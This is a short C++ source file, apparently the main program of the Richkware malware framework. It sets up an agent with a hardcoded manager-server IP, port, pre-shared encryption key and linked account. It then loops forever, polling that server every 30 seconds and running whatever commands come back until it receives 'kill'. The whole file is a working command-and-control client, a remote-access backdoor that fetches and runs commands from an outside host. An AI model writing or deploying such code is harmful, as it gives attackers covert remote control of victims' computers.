/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*      Created by bladez on 13/06/19.
*/

#include "src/richkware.h"
#include "src/utils.h"


int main() {
    const char *appName = "Richk";
    const char *defaultEncryptionKey = "richktest"; // pre-shared key with RMS, to enable encryption before receiving a server-side generated key
    const char *serverAddress = "172.24.51.229"; // Richkware-Manager-Server IP address
    const char *port = "8080"; // Richkware-Manager-Server TCP port
    const char *associatedUser = "er@fv.it"; // account in RMS which is linked to

    Richkware richkware(appName, defaultEncryptionKey, serverAddress, port, associatedUser);

//    richkware.network.fetchCommand("172.17.238.81", "8080", "er@fv.it", "Richk");
//    richkware.executeCommands();
    std::vector <std::string> commands = richkware.updateCommands(serverAddress, port, "");
    while (true) {
        while (commands.size() == 1 && commands.at(0) == "") {
            commands = richkware.updateCommands(serverAddress, port, "");
            std::cout << "waiting for commands..." << std::endl;
            Sleep(30000);
        }
        std::cout << "commands found: " << commands.size() << std::endl;
        for (size_t i = 0; i < commands.size(); ++i) {
            std::cout << "executing..." << commands.at(i) << std::endl;
            if (commands.at(i) == "kill") {
                return 0;
            }
            richkware.executeCommand(commands.at(i));
            //        commands = richkware.updateCommands("172.24.51.229", "8080", utils::concatVector(commands, "##"));
            //        commands.pop_back();
        }
    }
}


